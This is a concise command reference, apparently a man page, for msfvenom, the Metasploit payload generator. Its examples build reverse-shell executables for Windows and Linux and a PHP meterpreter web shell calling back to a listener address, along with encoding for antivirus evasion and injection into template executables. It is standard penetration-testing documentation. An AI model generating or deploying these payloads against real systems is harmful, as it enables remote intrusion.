# TAGLINE

generates payloads for Metasploit

# TLDR

**List payloads**

```msfvenom -l payloads```

**List encoders**

```msfvenom -l encoders```

**Generate Windows reverse shell**

```msfvenom -p windows/meterpreter/reverse_tcp LHOST=[192.168.1.10] LPORT=[4444] -f exe > [shell.exe]```

**Generate Linux payload**

```msfvenom -p linux/x86/shell_reverse_tcp LHOST=[192.168.1.10] LPORT=[4444] -f elf > [shell.elf]```

**Encode payload**

```msfvenom -p [payload] -e x86/shikata_ga_nai -i [5] -f exe > [encoded.exe]```

**Generate shellcode**

```msfvenom -p [payload] -f c```

**Generate web payload**

```msfvenom -p php/meterpreter/reverse_tcp LHOST=[ip] LPORT=[port] -f raw > [shell.php]```

# SYNOPSIS

**msfvenom** [_options_]

# PARAMETERS

**-p** _PAYLOAD_
> Payload to use. Use `-` for stdin.

**-f** _FORMAT_
> Output format (exe, elf, raw, c, python, powershell, etc.).

**-e** _ENCODER_
> Encoder to use.

**-i** _COUNT_
> Number of encoding iterations.

**-l** _TYPE_
> List available items (payloads, encoders, nops, formats, all).

**-a** _ARCH_
> Target architecture (x86, x64, arm, etc.).

**--platform** _PLATFORM_
> Target platform (windows, linux, osx, android, etc.).

**-b** _CHARS_
> Characters to avoid in the payload (bad chars).

**-o** _FILE_
> Save the payload to a file.

**-x** _FILE_
> Use a custom executable as a template.

**-k**
> Keep the template's functionality and inject payload as a new thread.

**-n** _LENGTH_
> Prepend a nopsled of the given length.

**-s** _SIZE_
> Maximum payload size in bytes.

**--smallest**
> Generate the smallest possible payload.

**LHOST**
> Local host address (payload variable).

**LPORT**
> Local port number (payload variable).

**--help**
> Display help information.

# DESCRIPTION

**msfvenom** generates payloads for Metasploit. It combines msfpayload and msfencode functionality.

The tool creates shellcode and executables. Supports encoding and format conversion.

# CAVEATS

Authorized testing only. AV may detect payloads. Part of Metasploit Framework.

# HISTORY

msfvenom replaced **msfpayload and msfencode** in Metasploit Framework, unifying payload generation.

# SEE ALSO

[msfconsole](/man/msfconsole)(1), [msfpc](/man/msfpc)(1), [nmap](/man/nmap)(1)

